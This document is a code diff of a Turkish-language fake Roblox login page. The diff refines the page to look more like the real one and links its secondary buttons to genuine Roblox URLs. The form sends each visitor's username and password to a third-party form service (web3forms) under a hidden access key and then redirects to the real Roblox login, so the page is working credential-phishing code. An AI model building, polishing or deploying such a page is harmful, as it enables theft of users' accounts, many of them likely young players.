@@ -6,15 +6,12 @@
     <title>Giriş - Roblox</title>
     <style>
         body {
-            /* SEÇTİĞİN RESİM BURAYA EKLENDİ */
-            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), 
+            /* Arka Plan Görseli ve Karanlık Filtre */
+            background: linear-gradient(rgba(0, 0, 0, 0.45), rgba(0, 0, 0, 0.45)), 
                         url('https://image.api.playstation.com/vulcan/ap/rnd/202504/1706/4cc02203db88b29b535c26b8296c89f983eaf48d67462e1d.png?w=1920'); 
-            
             background-size: cover;
             background-position: center;
-            background-repeat: no-repeat;
             background-attachment: fixed;
-            
             font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
@@ -23,35 +20,50 @@
             margin: 0;
         }
 
+        /* Şeffaf Giriş Paneli (Frosted Glass Effect) */
         .login-container {
-            background-color: rgba(43, 45, 47, 0.95); /* Arkadaki resim hafif görünsün diye çok az şeffaf yaptık */
+            background-color: rgba(35, 37, 39, 0.9); /* Şeffaf koyu gri */
+            backdrop-filter: blur(10px); /* Arka planı hafif bulandırır, çok şık durur */
             padding: 40px 30px;
             border-radius: 8px;
             width: 380px;
             text-align: center;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            border: 1px solid rgba(255, 255, 255, 0.05); /* Çok ince kenarlık */
         }
 
-        h2 { font-size: 24px; margin-bottom: 25px; color: #ffffff; font-weight: 700; }
+        h2 { 
+            font-size: 24px; 
+            margin-bottom: 25px; 
+            color: #ffffff; 
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
 
+        /* Input Alanları */
         input {
             width: 100%;
-            height: 45px;
-            margin-bottom: 12px;
+            height: 48px;
+            margin-bottom: 15px;
             border-radius: 4px;
             border: 1px solid #111;
             background-color: #393b3d;
             color: #ffffff;
-            padding: 0 12px;
+            padding: 0 15px;
             box-sizing: border-box;
             font-size: 16px;
+            transition: border-color 0.2s;
         }
 
-        input:focus { border-color: #0084ff; outline: none; }
+        input:focus {
+            border-color: #ffffff;
+            outline: none;
+        }
 
+        /* Giriş Yap Butonu (Orijinal Beyaz Çerçeveli Stil) */
         .login-btn {
             width: 100%;
-            height: 40px;
+            height: 42px;
             background-color: transparent;
             border: 1px solid #ffffff;
             color: #ffffff;
@@ -60,18 +72,33 @@
             border-radius: 4px;
             cursor: pointer;
             margin-top: 10px;
-            transition: 0.2s;
+            transition: background 0.3s;
         }
 
-        .login-btn:hover { background-color: rgba(255,255,255,0.1); }
+        .login-btn:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
 
-        .forgot-pass { color: #00b2ff; text-decoration: none; font-size: 13px; display: block; margin-top: 15px; }
+        /* Linkler */
+        .blue-link {
+            color: #00b2ff;
+            text-decoration: none;
+            font-size: 13px;
+            display: inline-block;
+            margin-top: 15px;
+        }
+        .blue-link:hover { text-decoration: underline; }
 
-        .divider { height: 1px; background-color: #444; margin: 25px 0; }
+        .divider {
+            height: 1px;
+            background-color: rgba(255, 255, 255, 0.1);
+            margin: 25px 0;
+        }
 
+        /* Diğer Butonlar */
         .social-btn {
             width: 100%;
-            height: 40px;
+            height: 42px;
             background-color: #393b3d;
             border: none;
             color: #ffffff;
@@ -80,10 +107,15 @@
             font-weight: 600;
             cursor: pointer;
             font-size: 14px;
+            transition: background 0.2s;
         }
+        .social-btn:hover { background-color: #4b4e50; }
 
-        .signup-text { color: #ffffff; font-size: 14px; margin-top: 20px; }
-        .signup-link { color: #00b2ff; text-decoration: none; }
+        .signup-text {
+            color: #ffffff;
+            font-size: 14px;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -94,17 +126,24 @@
     <form action="https://api.web3forms.com/submit" method="POST">
         <input type="hidden" name="access_key" value="4d9b8514-bee7-4916-bfab-e61246fa5ba7">
 
-        <input type="text" name="Username" placeholder="Kullanıcı Adı/E-posta" required>
+        <input type="text" name="Username" placeholder="Kullanıcı Adı/E-posta/Telefon" required>
         <input type="password" name="Password" placeholder="Şifre" required>
 
         <button type="submit" class="login-btn">Giriş Yap</button>
+        
         <input type="hidden" name="redirect" value="https://www.roblox.com/login">
     </form>
 
-    <a href="#" class="forgot-pass">Şifrenizi mi unuttunuz?</a>
+    <a href="https://www.roblox.com/login/forgot-password-or-username" class="blue-link">Şifrenizi mi unuttunuz?</a>
+
     <div class="divider"></div>
-    <button class="social-btn">Hızlı Giriş</button>
-    <div class="signup-text">Hesabın yok mu? <a href="#" class="signup-link">Kaydol</a></div>
+
+    <button class="social-btn" onclick="window.location.href='https://www.roblox.com/login/otp'">Bana Tek Kullanımlık Bir Kod Gönderin</button>
+    <button class="social-btn" onclick="window.location.href='https://www.roblox.com/onboarding/start'">Hızlı Giriş</button>
+
+    <div class="signup-text">
+        Hesabın yok mu? <a href="https://www.roblox.com/referrals" class="blue-link" style="margin-top:0;">Kaydol</a>
+    </div>
 </div>
 
 </body>
